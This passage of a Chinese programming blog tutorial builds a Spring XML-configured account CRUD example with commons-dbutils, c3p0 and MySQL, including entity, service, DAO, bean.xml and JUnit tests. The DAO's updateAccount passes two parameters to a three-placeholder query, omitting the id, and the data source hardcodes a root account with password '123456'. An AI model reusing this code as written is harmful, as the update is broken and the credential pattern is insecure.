class="name">artifactId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建数据库</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> eesy;</span><br></pre></td></tr></table></figure>

<p>导入sql表</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> account(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary key</span> auto_increment,</span><br><span class="line">    <span class="type">name</span> <span class="type">varchar</span>(<span class="number">40</span>),</span><br><span class="line">    <span class="type">money</span> <span class="type">float</span></span><br><span class="line">)<span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> account(<span class="type">name</span>, <span class="type">money</span>) <span class="keyword">values</span> (<span class="string">&#x27;aaa&#x27;</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> account(<span class="type">name</span>, <span class="type">money</span>) <span class="keyword">values</span> (<span class="string">&#x27;bbb&#x27;</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> account(<span class="type">name</span>, <span class="type">money</span>) <span class="keyword">values</span> (<span class="string">&#x27;ccc&#x27;</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>





<h3 id="1-2-编写实体类"><a href="#1-2-编写实体类" class="headerlink" title="1.2 编写实体类"></a>1.2 编写实体类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.domain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的实体类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Float money;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Float <span class="title">getMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMoney</span><span class="params">(Float money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Account&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, money=&quot;</span> + money +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>定义了三个私有变量，设置getter，setter和tostring方法。</p>
<h3 id="1-3-编写业务层代码"><a href="#1-3-编写业务层代码" class="headerlink" title="1.3 编写业务层代码"></a>1.3 编写业务层代码</h3><p>业务层接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的业务层接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IAccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询一个</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有5个查询方法</p>
<p>业务层实现类如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.dao.IAccountDao;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.IAccountService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的业务层实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">IAccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IAccountDao accountDao;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAccountDao</span><span class="params">(IAccountDao accountDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.accountDao = accountDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountDao.findAllAccount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountDao.findAccountById(accountId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        accountDao.saveAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        accountDao.updateAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        accountDao.deleteAccount(accountId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现类中引入了dao层接口类，dao层代码在1.4，实现类的方法调用dao层的代码进行增删改查。</p>
<h3 id="1-4-编写dao层代码"><a href="#1-4-编写dao层代码" class="headerlink" title="1.4 编写dao层代码"></a>1.4 编写dao层代码</h3><p>dao层接口类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的持久层接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IAccountDao</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询一个</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dao层实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.dao.impl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.dao.IAccountDao;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.QueryRunner;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanListHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 持久层实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountDaoImpl</span> <span class="keyword">implements</span> <span class="title">IAccountDao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> QueryRunner runner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRunner</span><span class="params">(QueryRunner runner)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.runner = runner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> runner.query(<span class="string">&quot;select * from account&quot;</span>, <span class="keyword">new</span> BeanListHandler&lt;Account&gt;(Account.class));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> runner.query(<span class="string">&quot;select * from account where id = ?&quot;</span>, <span class="keyword">new</span> BeanHandler&lt;Account&gt;(Account.class), accountId);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;insert into account(name, money) values(?,?)&quot;</span>, account.getName(),account.getMoney());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;update account set name=?, money=? where id =?&quot;</span>, account.getName(),account.getMoney());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;delete from account where id=?&quot;</span>, accountId);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="1-5-spring的bean-xml"><a href="#1-5-spring的bean-xml" class="headerlink" title="1.5 spring的bean.xml"></a>1.5 spring的bean.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置Service --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;accountService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.shadowflow.service.impl.AccountServiceImpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注入dao --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;accountDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;accountDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置Dao对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;accountDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.shadowflow.dao.impl.AccountDaoImpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注入QueryRunner --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;runner&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;runner&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置QueryRunner--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;runner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.commons.dbutils.QueryRunner&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--注入数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;ds&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--连接数据库的必备信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.16.42.151:3306/eesy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-6-编写测试类"><a href="#1-6-编写测试类" class="headerlink" title="1.6 编写测试类"></a>1.6 编写测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.IAccountService;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用Junit单元测试：测试我们的配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(locations = &quot;classpath:bean.xml&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IAccountService as;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFindAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        List&lt;Account&gt; accounts = as.findAllAccount();</span><br><span class="line">        <span class="keyword">for</span> (Account account : accounts) &#123;</span><br><span class="line">            System.out.println(account);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFindOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        Account account = as.findAccountById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSave</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Account account = <span class="keyword">new</span> Account();</span><br><span class="line">        account.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        account.setMoney(<span class="number">12345f</span>);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        as.saveAccount(account);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        Account account = as.findAccountById(<span class="number">4</span>);</span><br><span class="line">        account.setMoney(<span class="number">23456f</span>);</span><br><span class="line">        as.updateAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        as.deleteAccount(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-基于XML的注解案例"><a href="#2-基于XML的注解案例" class="headerlink" title="2 . 基于XML的注解案例"></a>2 . 基于XML的注解案例</h2><p>根xml的案例一样</p>
<h3 id="2-1-实体类"><a href="#2-1-实体类" class="headerlink" title="2.1 实体类"></a>2.1 实体类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的实体类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Float money;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Float <span class="title">getMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMoney</span><span class="params">(Float money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span 